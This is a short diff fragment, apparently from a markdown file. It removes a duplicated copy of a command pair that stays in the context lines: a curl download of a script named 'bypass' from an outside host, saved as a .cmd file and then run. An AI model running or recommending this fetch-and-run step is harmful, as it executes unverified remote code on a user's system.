@@ -8,8 +8,5 @@ curl -L mciolfi.me.com/bypass -o nome.cmd
 nome.cmd
 
 ```
-...
-curl -L mciolfi.me.com/bypass -o nome.cmd
-nome.cmd
-...
+
 Bye
